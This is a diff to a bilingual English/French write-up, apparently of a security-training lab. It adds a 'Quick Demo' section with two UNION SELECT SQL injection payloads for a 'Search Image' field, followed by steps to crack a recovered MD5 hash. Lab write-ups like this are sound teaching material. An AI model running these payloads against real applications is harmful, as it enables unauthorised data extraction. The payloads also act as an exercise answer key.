@@ -16,6 +16,15 @@
 
 **Union-Based SQL Injection** is a specific type of SQL injection where the UNION operator is used to combine the results of two or more SELECT statements into a single result. This allows the attacker to retrieve data from other tables that were not intended to be displayed by the original query.
 
+### ⚡ Quick Demo
+
+In the "Search Image" box, paste in order:
+```sql
+-1 UNION SELECT table_name, column_name FROM information_schema.columns
+-1 UNION SELECT url, comment FROM list_images
+```
+Then MD5-decrypt the hash found in the comment (crackstation.net) and SHA256 it.
+
 ### 📖 Approach
 
 In the "Search Image" section, I tested for SQL injection by inputting a standard payload like `1 OR 1=1`. It returned all images, confirmed the vulnerability. I then used `UNION SELECT` to enumerate the tables and columns.
@@ -65,6 +74,15 @@ To prevent SQL Injection:
 ### 📖 Définition
 
 L'**Injection SQL basée sur UNION** est un type spécifique d'injection SQL où l'opérateur UNION est utilisé pour combiner les résultats de deux instructions SELECT ou plus en un seul résultat. Cela permet à l'attaquant de récupérer des données d'autres tables qui n'étaient pas destinées à être affichées.
+
+### ⚡ Démo rapide
+
+Dans le champ "Search Image", coller dans l'ordre :
+```sql
+-1 UNION SELECT table_name, column_name FROM information_schema.columns
+-1 UNION SELECT url, comment FROM list_images
+```
+Puis déchiffrer le MD5 trouvé dans le commentaire (crackstation.net) et le hacher en SHA256.
 
 ### 📖 Approche
 
